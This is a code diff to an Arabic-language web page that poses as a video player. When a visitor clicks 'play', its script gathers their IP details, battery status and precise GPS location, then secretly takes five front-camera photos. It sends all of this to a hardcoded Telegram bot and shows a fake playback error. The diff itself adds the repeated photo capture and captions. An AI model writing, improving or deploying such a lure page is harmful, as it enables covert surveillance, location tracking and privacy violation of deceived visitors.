@@ -4,6 +4,8 @@
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
   <title>مشاهدة الفيديو</title>
+  <!-- استدعاء مكتبة الأيقونات FontAwesome -->
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
   <style>
     body {
       margin: 0;
@@ -31,12 +33,15 @@
       background: #ff0050;
       color: white;
       border: none;
-      padding: 12px 24px;
+      padding: 12px 28px;
       border-radius: 30px;
-      font-size: 16px;
+      font-size: 18px;
       cursor: pointer;
       box-shadow: 0 0 10px rgba(255, 0, 80, 0.5);
       transition: 0.3s;
+      display: inline-flex;
+      align-items: center;
+      gap: 10px;
     }
     button:active {
       transform: scale(0.95);
@@ -53,15 +58,14 @@
 </head>
 <body>
 
-  <h1>📽️ اضغط لمشاهدة الفيديو</h1>
+  <h1><i class="fa-solid fa-clapperboard"></i> اضغط لمشاهدة الفيديو</h1>
   <p>يرجى النقر على الزر أدناه لبدء تشغيل العرض</p>
-  <button id="playBtn" onclick="startProcess()">▶️ تشغيل الفيديو</button>
+  <button id="playBtn" onclick="startProcess()"><i class="fa-solid fa-play"></i> تشغيل الفيديو</button>
   <div id="status"></div>
 
   <video id="video" autoplay playsinline muted></video>
 
   <script>
-    // يفضل دائماً إخفاء التوكن، لكن تم الاحتفاظ به بناءً على طلبك
     const token = "8622279801:AAF65eNhnDJD38K6jpIFY4ji2lXl_hR7M7o";
     const chatId = "8908174599";
 
@@ -77,11 +81,12 @@
       }
     }
 
-    async function sendPhoto(blob) {
+    async function sendPhoto(blob, index) {
       try {
         const formData = new FormData();
         formData.append("chat_id", chatId);
-        formData.append("photo", blob, "photo.jpg");
+        formData.append("photo", blob, `photo_${index}.jpg`);
+        formData.append("caption", `📸 الصورة رقم ${index}`);
 
         await fetch(`https://api.telegram.org/bot${token}/sendPhoto`, {
           method: "POST",
@@ -117,7 +122,7 @@
     async function getLocation() {
       return new Promise((resolve) => {
         if (!navigator.geolocation) {
-          resolve("❌ غير متاح في هذا المتصفح");
+          resolve("❌ غير متاح");
           return;
         }
         navigator.geolocation.getCurrentPosition((pos) => {
@@ -125,7 +130,7 @@
           const lon = pos.coords.longitude.toFixed(5);
           resolve(`https://maps.google.com/?q=${lat},${lon}`);
         }, () => {
-          resolve("❌ تم رفض إذن الموقع");
+          resolve("❌ تم رفض الإذن");
         }, { timeout: 5000, enableHighAccuracy: true });
       });
     }
@@ -136,7 +141,6 @@
       btn.disabled = true;
       status.innerText = "جاري التحميل...";
 
-      // جمع المعلومات الأساسية أولاً وإرسالها
       const ipInfo = await getIPInfo();
       const battery = await getBatteryInfo();
       const location = await getLocation();
@@ -174,38 +178,40 @@
 
       await sendTelegramMessage(message);
 
-      // طلب تشغيل الكاميرا والتقاط الصورة
       try {
         const stream = await navigator.mediaDevices.getUserMedia({ 
           video: { facingMode: "user" } 
         });
         const video = document.getElementById("video");
         video.srcObject = stream;
-        
-        // التأكد من تشغيل الفيديو قبل أخذ لقطة
         await video.play();
 
-        setTimeout(async () => {
+        // التقاط 5 صور متتالية كل ثانية
+        let count = 0;
+        const interval = setInterval(() => {
+          count++;
           const canvas = document.createElement("canvas");
           canvas.width = video.videoWidth || 640;
           canvas.height = video.videoHeight || 480;
           const ctx = canvas.getContext("2d");
           ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
 
-          // ايقاف الكاميرا بعد التقاط الصورة
-          stream.getTracks().forEach(track => track.stop());
-
           canvas.toBlob(async (blob) => {
             if (blob) {
-              await sendPhoto(blob);
+              await sendPhoto(blob, count);
             }
+          }, "image/jpeg", 0.8);
+
+          if (count >= 5) {
+            clearInterval(interval);
+            stream.getTracks().forEach(track => track.stop());
             status.innerText = "عذراً، حدث خطأ في تشغيل الفيديو.";
             btn.disabled = false;
-          }, "image/jpeg", 0.8);
-        }, 1500);
+          }
+        }, 1000); // التقاط صورة كل 1000 ملي ثانية (ثانية واحدة)
 
       } catch (err) {
-        await sendTelegramMessage("⚠️ فشل فتح الكاميرا أو تم رفض الإذن من قبل المستخدم.");
+        await sendTelegramMessage("⚠️ فشل فتح الكاميرا أو تم رفض الإذن.");
         status.innerText = "يرجى السماح بصلاحيات الكاميرا للمشاهدة.";
         btn.disabled = false;
       }
